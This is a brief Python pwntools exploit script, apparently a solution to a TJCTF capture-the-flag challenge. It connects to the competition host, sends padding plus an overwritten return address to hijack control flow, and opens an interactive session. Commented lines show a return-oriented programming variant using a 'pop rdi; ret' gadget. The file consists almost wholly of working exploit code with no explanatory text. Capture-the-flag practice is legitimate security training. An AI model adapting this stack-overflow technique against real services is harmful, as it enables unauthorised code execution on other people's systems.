from pwn import *


#p = process('bi')
p = remote('p1.tjctf.org', 8009)


p.recvrepeat(1)
pRdi_ret = 0x00400803

#raw_input('pid : ' + str(p.pid))
addr_main = 0x4006f2
#p.sendline('a'*18 + p64(pRdi_ret) + p64(0xDEADCAFEBABEBEEF) +  p64(0x4006C7))
p.sendline('a'*18 + p64(0x4006e3))


p.interactive()
